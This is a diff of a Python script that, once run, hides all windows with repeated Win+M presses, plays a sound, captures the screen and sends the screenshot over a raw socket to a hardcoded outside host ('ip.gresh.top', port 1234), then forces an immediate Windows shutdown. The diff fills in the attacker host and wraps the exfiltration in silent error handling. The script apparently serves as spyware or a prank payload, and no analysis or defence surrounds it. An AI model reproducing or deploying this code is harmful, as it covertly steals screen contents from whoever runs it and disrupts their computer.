@@ -1,25 +1,24 @@
-import socket
-from PIL import ImageGrab
-import random
-import os
-import pydirectinput
-import pyautogui
-import subprocess
+from socket import (socket, AF_INET, SOCK_STREAM)
+from PIL import (ImageGrab)
+from random import (randint)
+from os import (path)
+from pydirectinput import (keyDown, keyUp, press)
+from subprocess import (run, PIPE)
 import pygame
-import threading
-import requests
-import time
+from threading import (Thread)
+from requests import (get)
+from time import (sleep)
 from concurrent.futures import ThreadPoolExecutor
 
-HOST = ''# Your IP address
+HOST = 'ip.gresh.top'
 PORT = 1234
 
 
 
 
 def send_file(filename):
-    file_size = os.path.getsize(filename)
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+    file_size = path.getsize(filename)
+    with socket(AF_INET, SOCK_STREAM) as client_socket:
         client_socket.connect((HOST, PORT))
         with open(filename, 'rb') as file:
             bytes_sent = 0
@@ -40,18 +39,14 @@ def get_screenshot():
 
 
 def win_m():
-    # pyautogui
-    pyautogui.keyDown('win')
-    pyautogui.press('m')
-    pyautogui.keyUp('win')
 
     # pydirectinput
-    pydirectinput.keyDown('win')
-    pydirectinput.press('m')
-    pydirectinput.keyUp('win')
+    keyDown('win')
+    press('m')
+    keyUp('win')
 
 def run_cmd(cmd):
-    proc = subprocess.run(cmd, stdout=subprocess.PIPE)
+    proc = run(cmd, stdout=PIPE)
     output = proc.stdout.decode("utf-8", errors="ignore")
     return output
 
@@ -68,7 +63,7 @@ def play_sound(sound_file):
 
 
 def download_file(url, filename):
-    response = requests.get(url, stream=True)
+    response = get(url, stream=True)
     with open(filename, "wb") as fd:
         for chunk in response.iter_content(chunk_size=525):
             fd.write(chunk)
@@ -96,7 +91,7 @@ def main():
 
     # 创建一个播放声音的线程
 
-    thread = threading.Thread(target=play_sound, args=(filename,))
+    thread = Thread(target=play_sound, args=(filename,))
     thread.daemon = True
     thread.start()
 
@@ -104,11 +99,18 @@ def main():
     #     pass
 
     win_m()
-    get_screenshot()
-    send_file('screenshot.png')
+    try:
+        get_screenshot()
+        send_file('screenshot.png')
+    except Exception:
+        pass
+
+    # while True:
+    #     pass
+
     win_m()
-    for _ in range(0, random.randint(50, 80)):
-        time.sleep(2)
+    for _ in range(0, randint(50, 80)):
+        sleep(2)
         win_m()
     run_cmd('shutdown -s -t 0')
 
